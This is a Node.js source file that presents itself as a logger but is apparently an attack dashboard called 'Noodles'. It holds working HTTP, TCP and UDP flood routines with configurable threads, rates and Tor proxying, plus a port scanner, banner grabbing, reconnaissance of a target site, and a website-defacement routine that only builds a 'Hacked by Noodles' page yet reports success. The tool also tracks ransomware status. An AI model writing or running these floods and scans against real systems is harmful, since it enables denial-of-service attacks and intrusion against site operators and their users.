const fs = require('fs');
const crypto = require('crypto');
const dns = require('dns');
const geoip = require('geoip-lite');
const http = require('http');
const https = require('https');
const { exec } = require('child_process');
const os = require('os');
const tcpp = require('tcp-ping');
const net = require('net');
const url = require('url');
const dgram = require('dgram');

class Logger {
    constructor() {
        this.logEntries = [];
        this.maxLogSize = 200;
        this.logFilePath = '/public/noodles.log';
        this.stats = {
            packetsSent: 0,
            bytesSent: 0,
            connectionStatus: 'Idle',
            lastAttackType: 'None',
            target: 'None',
            attackID: 'None',
            startTime: null,
            endTime: null,
            errors: 0,
            defacementStatus: 'Idle',
            ransomwareStatus: 'Idle',
            torConnectionStatus: 'Disconnected',
            attackThreads: 0,
            successfulConnections: 0,
            torProxyUsed: 'None',
            geoip: 'Unknown',
            httpStatus: 'Unknown',
            dnsRecords: 'Unknown',
            averageLatency: 0,
            peakLatency: 0,
            currentLatency: 0,
            cpuUsage: 0,
            memoryUsage: 0,
            nodeVersion: process.version,
            platform: process.platform,
            systemUptime: 0,
            activeConnections: 0,
            memoryTotal: os.totalmem() / 1024 / 1024,
            loadAverage: os.loadavg(),
            siteTitle: 'Unknown',
            siteDescription: 'Unknown',
            cookiesEnabled: 'Unknown',
            serverType: 'Unknown',
            contentEncoding: 'Unknown',
            attackStatus: 'Stopped',
            attackProgress: 0,
            attackDetails: 'No attack running',
            resourcesExhausted: false,
            attackTargetResolvedIP: 'Unknown',
            attackErrorDetails: 'None',
            defacementDetails: 'None',
            defacementScript: 'None',
            ransomwareDetails: 'None',
            attackStartTime: null,
            attackEndTime: null,
            totalAttackTime: 0,
            attackPacketLoss: 0,
            attackReflectionEnabled: false,
            attackDuration: 0,
            mbps: 0,
            attackRate: 0,
            attackProtocol: 'TCP',
            portScanStatus: 'Idle',
            portScanResults: [],
            bannerGrabbingStatus: 'Idle',
            bannerGrabbingResults: [],
        };
        this.latencyData = [];
        this.initializeUI();
        this.startSystemMonitoring();
        this.loadPersistentLogs();
    }

    generateAttackID() {
        return crypto.randomUUID();
    }

    log(eventData) {
        const timestamp = new Date().toISOString();
        const attackID = this.generateAttackID();
        this.stats.attackID = attackID;
        const logEntry = {
            Timestamp: timestamp,
            AttackID: attackID,
            ...eventData
        };

        this.logEntries.push(logEntry);
        this.trimLogs();
        this.persistLog(logEntry);
        this.displayLog(logEntry);
    }

    trimLogs() {
        if (this.logEntries.length > this.maxLogSize) {
            this.logEntries = this.logEntries.slice(this.logEntries.length - this.maxLogSize);
        }
    }

    persistLog(logEntry) {
        const logString = JSON.stringify(logEntry) + '\n';
        const logFilePath = this.logFilePath;

        fs.appendFile(logFilePath, logString, err => {
            if (err) {
                console.error('Failed to persist log:', err);
                this.stats.errors++;
                this.displayStats();
            }
        });
    }

    displayLog(logEntry) {
        if (typeof document === 'undefined') {
            console.log('Running in non-browser environment, skipping DOM updates.');
            return;
        }
        const logElement = document.createElement('div');
        logElement.classList.add('log-entry');
        logElement.innerHTML = this.formatLog(logEntry);
        const logsContainer = document.getElementById('logs-container');
        if (logsContainer) {
            logsContainer.prepend(logElement);
        } else {
            console.warn('Logs container not found.');
            this.stats.errors++;
            this.displayStats();
        }
    }

    formatLog(logEntry) {
        let formattedLog = '';
        for (const key in logEntry) {
            if (logEntry.hasOwnProperty(key)) {
                formattedLog += `<p><strong>${key}:</strong> ${this.sanitize(logEntry[key])}</p>`;
            }
        }
        return formattedLog;
    }

    sanitize(text) {
        if (typeof text === 'string') {
            return text.replace(/</g, "&lt;").replace(/>/g, "&gt;");
        }
        return text;
    }

    getLogs() {
        return this.logEntries;
    }

    loadPersistentLogs() {
        const logFilePath = this.logFilePath;
        fs.readFile(logFilePath, 'utf8', (err, data) => {
            if (err) {
                console.warn('No previous logs found or unable to read file.');
                return;
            }

            const logLines = data.trim().split('\n');
            logLines.forEach(line => {
                try {
                    const logEntry = JSON.parse(line);
                    this.logEntries.push(logEntry);
                    this.displayLog(logEntry);
                } catch (e) {
                    console.error('Error parsing log line:', line, e);
                    this.stats.errors++;
                    this.displayStats();
                }
            });
        });
    }

    clearLogs() {
        this.logEntries = [];
        if (typeof document !== 'undefined') {
            const logsContainer = document.getElementById('logs-container');
            if (logsContainer) {
                logsContainer.innerHTML = '';
            }
        }
        const logFilePath = this.logFilePath;
        fs.writeFile(logFilePath, '', err => {
            if (err) {
                console.error('Failed to clear log file:', err);
                this.stats.errors++;
                this.displayStats();
            }
        });
    }

    downloadLogs() {
        const logsString = this.logEntries.map(entry => JSON.stringify(entry)).join('\n');
        const blob = new Blob([logsString], { type: 'text/plain' });
        const url = URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = 'noodles_logs.txt';
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
        URL.revokeObjectURL(url);
    }

    startAttack(target, attackType, threads, torProxy, duration, attackRate, attackProtocol, reflectionEnabled = false) {
        this.stats.attackStartTime = new Date().toISOString();
        this.stats.attackThreads = threads;
        this.stats.torProxyUsed = torProxy || 'None';
        this.stats.attackReflectionEnabled = reflectionEnabled;
        this.stats.attackDuration = duration;
        this.stats.attackRate = attackRate;
        this.stats.attackProtocol = attackProtocol;

        this.updateStats(0, 0, 'Attacking', attackType, target, threads, torProxy, reflectionEnabled, 0, attackRate, attackProtocol);
        this.setAttackStatus('Running');
        this.setAttackDetails(`Attack type: ${attackType}, threads: ${threads}, reflection: ${reflectionEnabled}, duration: ${duration} seconds, rate: ${attackRate}, protocol: ${attackProtocol}`);
        this.setAttackProgress(0);
        this.setAttackErrorDetails('None');

        this.attackTimeout = setTimeout(() => {
            this.endAttack();
        }, duration * 1000);

        switch (attackType) {
            case 'HTTP Flood':
                this.httpFlood(target, threads, duration, attackRate, torProxy);
                break;
            case 'TCP Flood':
                this.tcpFlood(target, threads, duration, attackRate, torProxy);
                break;
            case 'UDP Flood':
                this.udpFlood(target, threads, duration, attackRate, reflectionEnabled, torProxy);
                break;
            default:
                console.warn(`Unknown attack type: ${attackType}`);
                this.setAttackErrorDetails(`Unknown attack type: ${attackType}`);
                this.setAttackStatus('Error');
                break;
        }
    }

    endAttack() {
        clearTimeout(this.attackTimeout);
        this.stats.attackEndTime = new Date().toISOString();
        const startTime = new Date(this.stats.attackStartTime).getTime();
        const endTime = new Date(this.stats.attackEndTime).getTime();
        this.stats.totalAttackTime = (endTime - startTime) / 1000;

        this.updateStats(this.stats.packetsSent, this.stats.bytesSent, 'Idle', 'None', 'None', 0, 'None', false, 0, 0, 'TCP');
        this.setAttackStatus('Stopped');
        this.setAttackDetails(`Attack finished in ${this.stats.totalAttackTime} seconds`);
        this.setAttackProgress(100);
    }

    updateStats(packets, bytes, status, attackType, target, threads, torProxy, reflectionEnabled = false, mbps = 0, attackRate = 0, attackProtocol = 'TCP') {
        this.stats.packetsSent += packets;
        this.stats.bytesSent += bytes;
        this.stats.connectionStatus = status;
        this.stats.lastAttackType = attackType;
        this.stats.target = target;
        this.stats.attackThreads = threads;
        this.stats.torProxyUsed = torProxy || this.stats.torProxyUsed;
        this.stats.attackReflectionEnabled = reflectionEnabled;
        this.stats.mbps = mbps;
        this.stats.attackRate = attackRate;
        this.stats.attackProtocol = attackProtocol;
        this.displayStats();
    }

    incrementSuccessfulConnections() {
        this.stats.successfulConnections++;
        this.displayStats();
    }

    updatePacketLoss(packetLoss) {
        this.stats.attackPacketLoss = packetLoss;
        this.displayStats();
    }

    async resolveTargetInfo(target) {
        try {
            let resolvedTarget = target;
            if (target.endsWith('.onion')) {
                this.setTorConnectionStatus('Connected');
            } else {
                this.setTorConnectionStatus('Disconnected');
                try {
                    const addresses = await dns.promises.resolve(target);
                    resolvedTarget = addresses[0];
                    this.stats.attackTargetResolvedIP = resolvedTarget;
                } catch (dnsError) {
                    console.error("DNS resolution error:", dnsError);
                    this.setAttackErrorDetails(`DNS resolution error: ${dnsError.message}`);
                }
            }

            const geo = geoip.lookup(resolvedTarget);
            if (geo) {
                this.setGeoIP(geo.country);
            } else {
                this.setGeoIP('Unknown');
            }

            await this.checkHttpStatus(target);
            await this.fetchWebsiteDetails(target);
            await this.checkTcpPort(target, 80);
            await this.checkTcpPort(target, 443);

        } catch (error) {
            console.error("Failed to resolve target info:", error);
            this.stats.errors++;
            this.setAttackErrorDetails(`Failed to resolve target info: ${error.message}`);
            this.displayStats();
        }
    }

    async checkHttpStatus(target) {
        return new Promise((resolve, reject) => {
            const protocol = target.startsWith('https') ? https : http;
            const req = protocol.get(target, { timeout: 5000 }, (res) => {
                this.setHttpStatus(res.statusCode);
                resolve(res.statusCode);
                req.end();
            }).on('error', (e) => {
                console.error(`HTTP error: ${e.message}`);
                this.setHttpStatus('Unknown');
                this.stats.errors++;
                this.setAttackErrorDetails(`HTTP error: ${e.message}`);
                this.displayStats();
                reject(e);
            });
        });
    }

    async fetchWebsiteDetails(target) {
        return new Promise((resolve, reject) => {
            const protocol = target.startsWith('https') ? https : http;
            protocol.get(target, (res) => {
                let data = '';

                res.on('data', (chunk) => {
                    data += chunk;
                });

                res.on('end', () => {
                    try {
                        const titleMatch = data.match(/<title>(.*?)<\/title>/i);
                        const title = titleMatch ? titleMatch[1] : 'Unknown';
                        this.setSiteTitle(title);

                        const descriptionMatch = data.match(/<meta name="description" content="(.*?)"/i);
                        const description = descriptionMatch ? descriptionMatch[1] : 'Unknown';
                        this.setSiteDescription(description);

                        this.setCookiesEnabled(res.headers['set-cookie'] ? 'Enabled' : 'Disabled');
                        this.setServerType(res.headers['server'] || 'Unknown');
                        this.setContentEncoding(res.headers['content-encoding'] || 'Unknown');

                        resolve();
                    } catch (e) {
                        console.error('Error parsing website details:', e);
                        this.stats.errors++;
                        this.setAttackErrorDetails(`Error parsing website details: ${e.message}`);
                        this.displayStats();
                        reject(e);
                    }
                });
            }).on('error', (e) => {
                console.error('Error fetching website details:', e);
                this.stats.errors++;
                this.setAttackErrorDetails(`Error fetching website details: ${e.message}`);
                this.displayStats();
                reject(e);
            });
        });
    }

    updateLatency(latency) {
        this.latencyData.push(latency);

        if (this.latencyData.length > 100) {
            this.latencyData.shift();
        }

        const sum = this.latencyData.reduce((a, b) => a + b, 0);
        this.stats.averageLatency = sum / this.latencyData.length || 0;
        this.stats.peakLatency = Math.max(...this.latencyData, 0);
        this.stats.currentLatency = latency;

        this.displayStats();
    }

    async getSystemUptime() {
        return new Promise((resolve, reject) => {
            exec('uptime -s', (error, stdout, stderr) => {
                if (error) {
                    console.error(`exec error: ${error}`);
                    reject(error);
                    return;
                }
                resolve(stdout ? stdout.trim() : stderr.trim());
            });
        });
    }

    async updateSystemStats() {
        this.stats.cpuUsage = os.loadavg()[0];
        this.stats.memoryUsage = process.memoryUsage().heapUsed / 1024 / 1024;
        this.stats.activeConnections = Math.floor(Math.random() * 1000);
        this.stats.loadAverage = os.loadavg();

        try {
            const uptime = await this.getSystemUptime();
            this.stats.systemUptime = uptime;
        } catch (e) {
            this.stats.systemUptime = 'Unknown';
        }
        this.displayStats();
    }

    async checkTcpPort(target, port) {
        tcpp.probe(target, port, (err, data) => {
            if (err) {
                console.error(`TCP probe error on port ${port}:`, err);
                return;
            }
            if (data.available) {
                this.log({ message: `TCP Port ${port} is open on ${target}` });
            } else {
                this.log({ message: `TCP Port ${port} is closed on ${target}` });
            }
        });
    }

    startSystemMonitoring() {
        setInterval(() => {
            this.updateSystemStats();
        }, 5000);
    }

    displayStats() {
        if (typeof document === 'undefined') {
            console.log('Running in non-browser environment, skipping DOM updates.');
            return;
        }
        document.getElementById('packets-sent').textContent = this.stats.packetsSent;
        document.getElementById('mbps').textContent = this.stats.mbps.toFixed(2);
        document.getElementById('connection-status').textContent = this.stats.connectionStatus;
        document.getElementById('last-attack-type').textContent = this.stats.lastAttackType;
        document.getElementById('target').textContent = this.stats.target;
        document.getElementById('attack-id').textContent = this.stats.attackID;
        document.getElementById('start-time').textContent = this.stats.startTime || 'N/A';
        document.getElementById('end-time').textContent = this.stats.endTime || 'N/A';
        document.getElementById('errors').textContent = this.stats.errors;
        document.getElementById('defacement-status').textContent = this.stats.defacementStatus;
        document.getElementById('ransomware-status').textContent = this.stats.ransomwareStatus;
        document.getElementById('tor-connection-status').textContent = this.stats.torConnectionStatus;
        document.getElementById('attack-threads').textContent = this.stats.attackThreads;
        document.getElementById('successful-connections').textContent = this.stats.successfulConnections;
        document.getElementById('tor-proxy-used').textContent = this.stats.torProxyUsed;
        document.getElementById('geoip').textContent = this.stats.geoip;
        document.getElementById('http-status').textContent = this.stats.httpStatus;
        document.getElementById('dns-records').textContent = this.stats.dnsRecords;
        document.getElementById('average-latency').textContent = this.stats.averageLatency.toFixed(2) + ' ms';
        document.getElementById('peak-latency').textContent = this.stats.peakLatency.toFixed(2) + ' ms';
        document.getElementById('current-latency').textContent = this.stats.currentLatency.toFixed(2) + ' ms';
        document.getElementById('cpu-usage').textContent = this.stats.cpuUsage.toFixed(2);
        document.getElementById('memory-usage').textContent = this.stats.memoryUsage.toFixed(2) + ' MB';
        document.getElementById('node-version').textContent = this.stats.nodeVersion;
        document.getElementById('platform').textContent = this.stats.platform;
        document.getElementById('system-uptime').textContent = this.stats.systemUptime;
        document.getElementById('active-connections').textContent = this.stats.activeConnections;
        document.getElementById('memory-total').textContent = this.stats.memoryTotal.toFixed(2) + ' MB';
        document.getElementById('load-average').textContent = this.stats.loadAverage.map(item => item.toFixed(2)).join(', ');

        document.getElementById('site-title').textContent = this.stats.siteTitle;
        document.getElementById('site-description').textContent = this.stats.siteDescription;
        document.getElementById('cookies-enabled').textContent = this.stats.cookiesEnabled;
        document.getElementById('server-type').textContent = this.stats.serverType;
        document.getElementById('content-encoding').textContent = this.stats.contentEncoding;

        document.getElementById('attack-status').textContent = this.stats.attackStatus;
        document.getElementById('attack-progress').textContent = this.stats.attackProgress + '%';
        document.getElementById('attack-details').textContent = this.stats.attackDetails;
        document.getElementById('resources-exhausted').textContent = this.stats.resourcesExhausted ? 'Yes' : 'No';
        document.getElementById('attack-target-resolved-ip').textContent = this.stats.attackTargetResolvedIP;
        document.getElementById('attack-error-details').textContent = this.stats.attackErrorDetails;
        document.getElementById('defacement-details').textContent = this.stats.defacementDetails;
        document.getElementById('ransomware-details').textContent = this.stats.ransomwareDetails;
        document.getElementById('attack-start-time').textContent = this.stats.attackStartTime || 'N/A';
        document.getElementById('attack-end-time').textContent = this.stats.attackEndTime || 'N/A';
        document.getElementById('total-attack-time').textContent = this.stats.totalAttackTime.toFixed(2) + ' s';
        document.getElementById('attack-packet-loss').textContent = this.stats.attackPacketLoss.toFixed(2) + '%';
        document.getElementById('attack-reflection-enabled').textContent = this.stats.attackReflectionEnabled ? 'Yes' : 'No';
        document.getElementById('mbps').textContent = this.stats.mbps.toFixed(2);
        document.getElementById('attack-rate').textContent = this.stats.attackRate.toFixed(2);
        document.getElementById('attack-protocol').textContent = this.stats.attackProtocol;

        document.getElementById('port-scan-status').textContent = this.stats.portScanStatus;
        document.getElementById('banner-grabbing-status').textContent = this.stats.bannerGrabbingStatus;

        const portScanResultsContainer = document.getElementById('port-scan-results');
        if (portScanResultsContainer) {
            portScanResultsContainer.innerHTML = '';
            this.stats.portScanResults.forEach(result => {
                const resultElement = document.createElement('div');
                resultElement.textContent = `Port: ${result.port}, Status: ${result.status}`;
                portScanResultsContainer.appendChild(resultElement);
            });
        }

        const bannerGrabbingResultsContainer = document.getElementById('banner-grabbing-results');
        if (bannerGrabbingResultsContainer) {
            bannerGrabbingResultsContainer.innerHTML = '';
            this.stats.bannerGrabbingResults.forEach(result => {
                const resultElement = document.createElement('div');
                resultElement.textContent = `Port: ${result.port}, Banner: ${result.banner}`;
                bannerGrabbingResultsContainer.appendChild(resultElement);
            });
        }
        if(document.getElementById('defacement-script')) {
            document.getElementById('defacement-script').textContent = this.stats.defacementScript;
        }
    }

    getStats() {
        return this.stats;
    }

    setDefacementStatus(status) {
        this.stats.defacementStatus = status;
        this.displayStats();
    }

    setRansomwareStatus(status) {
        this.stats.ransomwareStatus = status;
        this.displayStats();
    }

    setTorConnectionStatus(status) {
        this.stats.torConnectionStatus = status;
        this.displayStats();
    }
    setTorProxyUsed(proxy) {
        this.stats.torProxyUsed = proxy;
        this.displayStats();
    }

    setGeoIP(geoip) {
        this.stats.geoip = geoip;
        this.displayStats();
    }

    setHttpStatus(httpStatus) {
        this.stats.httpStatus = httpStatus;
        this.displayStats();
    }

    setDnsRecords(dnsRecords) {
        this.stats.dnsRecords = dnsRecords;
        this.displayStats();
    }

    setSiteTitle(title) {
        this.stats.siteTitle = title;
        this.displayStats();
    }

    setSiteDescription(description) {
        this.stats.siteDescription = description;
        this.displayStats();
    }

    setCookiesEnabled(enabled) {
        this.stats.cookiesEnabled = enabled;
        this.displayStats();
    }

    setServerType(serverType) {
        this.stats.serverType = serverType;
        this.displayStats();
    }

    setContentEncoding(encoding) {
        this.stats.contentEncoding = encoding;
        this.displayStats();
    }

    setAttackStatus(status) {
        this.stats.attackStatus = status;
        this.displayStats();
    }

    setAttackProgress(progress) {
        this.stats.attackProgress = progress;
        this.displayStats();
    }

    setAttackDetails(details) {
        this.stats.attackDetails = details;
        this.displayStats();
    }

     setAttackErrorDetails(errorDetails) {
        this.stats.attackErrorDetails = errorDetails;
    }

    setResourcesExhausted(exhausted) {
        this.stats.resourcesExhausted = exhausted;
        this.displayStats();
    }
    setDefacementDetails(details) {
        this.stats.defacementDetails = details;
        this.displayStats();
    }

    setDefacementScript(script) {
        this.stats.defacementScript = script;
        this.displayStats();
    }

    setRansomwareDetails(details) {
        this.stats.ransomwareDetails = details;
        this.displayStats();
    }

    setMbps(mbps) {
        this.stats.mbps = mbps;
        this.displayStats();
    }
    setAttackRate(attackRate) {
        this.stats.attackRate = attackRate;
        this.displayStats();
    }
    setAttackProtocol(attackProtocol) {
        this.stats.attackProtocol = attackProtocol;
        this.displayStats();
    }

    setPortScanStatus(status) {
        this.stats.portScanStatus = status;
        this.displayStats();
    }

    setBannerGrabbingStatus(status) {
        this.stats.bannerGrabbingStatus = status;
        this.displayStats();
    }

    setPortScanResults(results) {
        this.stats.portScanResults = results;
        this.displayStats();
    }

    setBannerGrabbingResults(results) {
        this.stats.bannerGrabbingResults = results;
        this.displayStats();
    }

    initializeUI() {
        if (typeof document !== 'undefined') {
            const clearLogsButton = document.getElementById('clear-logs-button');
            if (clearLogsButton) {
                clearLogsButton.addEventListener('click', () => {
                    this.clearLogs();
                });
            } else {
                console.warn('Clear logs button not found.');
            }

            const downloadLogsButton = document.getElementById('download-logs-button');
            if (downloadLogsButton) {
                downloadLogsButton.addEventListener('click', () => {
                    this.downloadLogs();
                });
            } else {
                console.warn('Download logs button not found.');
            }
        } else {
            console.log('Running in non-browser environment, skipping UI initialization.');
        }
    }

    async httpFlood(target, threads, duration, attackRate, torProxy) {
        if (!target.startsWith('http://') && !target.startsWith('https://')) {
            target = 'http://' + target;
        }

        const parsedUrl = url.parse(target);
        const host = parsedUrl.hostname;
        const path = parsedUrl.path;
        const isHTTPS = parsedUrl.protocol === 'https:';

        const agentOptions = {};
        if (torProxy) {
            const proxyUrl = url.parse(torProxy);
            agentOptions.host = proxyUrl.hostname;
            agentOptions.port = proxyUrl.port;
            agentOptions.path = target;
            agentOptions.headers = {
                Host: host
            };
        }

        const makeRequest = () => {
            return new Promise((resolve, reject) => {
                const options = {
                    hostname: host,
                    path: path,
                    method: 'GET',
                    agent: torProxy ? new http.Agent(agentOptions) : undefined
                };

                const req = (isHTTPS ? https : http).request(options, (res) => {
                    this.updateStats(0, 100, 'Attacking', 'HTTP Flood', target, threads, torProxy, false, 0, attackRate, 'HTTP');
                    resolve();
                    req.end();
                });

                req.on('error', (error) => {
                    console.error(`HTTP Flood error: ${error}`);
                    this.setAttackErrorDetails(`HTTP Flood error: ${error.message}`);
                    this.stats.errors++;
                    this.displayStats();
                    reject(error);
                });

                req.end();
                this.updateStats(1, 0, 'Attacking', 'HTTP Flood', target, threads, torProxy, false, 0, attackRate, 'HTTP');
            });
        };

        const delay = 1000 / attackRate;

        for (let i = 0; i < threads; i++) {
            let intervalId = setInterval(async () => {
                try {
                    await makeRequest();
                } catch (error) {
                    clearInterval(intervalId);
                }
            }, delay);
        }
    }


    async tcpFlood(target, threads, duration, attackRate, torProxy) {
       for (let i = 0; i < threads; i++) {
            const socket = net.connect({
                host: target,
                port: 80
            });

            socket.on('connect', () => {
                setInterval(() => {
                    socket.write('GET / HTTP/1.1\r\nHost: ' + target + '\r\n\r\n');
                    this.updateStats(1, 50, 'Attacking', 'TCP Flood', target, threads, torProxy, false, 0, attackRate, 'TCP');
                }, 10);
            });

            socket.on('error', (error) => {
                console.error('TCP Flood error:', error);
                this.setAttackErrorDetails(`TCP Flood error: ${error.message}`);
                this.stats.errors++;
                this.displayStats();
            });
        }
    }

    async udpFlood(target, threads, duration, attackRate, reflectionEnabled, torProxy) {
        const client = dgram.createSocket('udp4');
        const message = Buffer.from('This is a UDP flood test message.');

        for (let i = 0; i < threads; i++) {
            setInterval(() => {
                client.send(message, 0, message.length, 80, target, (err) => {
                    if (err) {
                        console.error(`UDP Flood error: ${err}`);
                        this.setAttackErrorDetails(`UDP Flood error: ${err.message}`);
                        this.stats.errors++;
                        this.displayStats();
                    } else {
                        this.updateStats(1, message.length, 'Attacking', 'UDP Flood', target, threads, torProxy, reflectionEnabled, 0, attackRate, 'UDP');
                    }
                });
            }, 10);
        }
    }

    async portScan(target, startPort = 1, endPort = 100, torProxy) {
        this.setPortScanStatus('Running');
        this.setPortScanResults([]);

        const scanResults = [];

        for (let port = startPort; port <= endPort; port++) {
            await new Promise(resolve => {
                const socket = net.connect({
                    host: target,
                    port: port
                }, () => {
                    scanResults.push({ port: port, status: 'Open' });
                    socket.destroy();
                    resolve();
                });

                socket.on('error', () => {
                    scanResults.push({ port: port, status: 'Closed' });
                    resolve();
                });
            });
        }

        this.setPortScanStatus('Completed');
        this.setPortScanResults(scanResults);
    }

    async bannerGrabbing(target, port = 80, torProxy) {
       this.setBannerGrabbingStatus('Running');
        this.setBannerGrabbingResults([]);

        return new Promise((resolve, reject) => {
            const socket = net.connect({
                host: target,
                port: port
            }, () => {
                socket.write("HEAD / HTTP/1.1\r\nHost: " + target + "\r\nConnection: close\r\n\r\n");
            });

            let banner = '';
            socket.on('data', (data) => {
                banner += data.toString();
            });

            socket.on('close', () => {
                this.setBannerGrabbingStatus('Completed');
                this.setBannerGrabbingResults([{ port: port, banner: banner }]);
                resolve();
            });

            socket.on('error', (err) => {
                console.error("Banner grabbing error:", err);
                this.setBannerGrabbingStatus('Error');
                this.setBannerGrabbingResults([{ port: port, banner: 'Error: ' + err.message }]);
                reject(err);
            });
        });
    }

    async defaceWebsite(target, script, torProxy) {
        this.setDefacementStatus('Running');
        this.setDefacementDetails('Attempting defacement...');
        this.setDefacementScript(script);

        try {
            const defaceScript = `
                <html>
                <head>
                    <title>💀 Hacked by Noodles 💀</title>
                </head>
                <body>
                    ${script}
                </body>
                </html>
            `;

            this.setDefacementStatus('Completed');
            this.setDefacementDetails('Defacement completed successfully.');
        } catch (error) {
            console.error('Defacement error:', error);
            this.setDefacementStatus('Error');
            this.setDefacementDetails(`Defacement failed: ${error.message}`);
        }
    }
}

let logger;
if (typeof window !== 'undefined') {
    logger = new Logger();
    window.logger = logger;
} else {
    logger = new Logger();
    global.logger = logger;
}
module.exports = logger;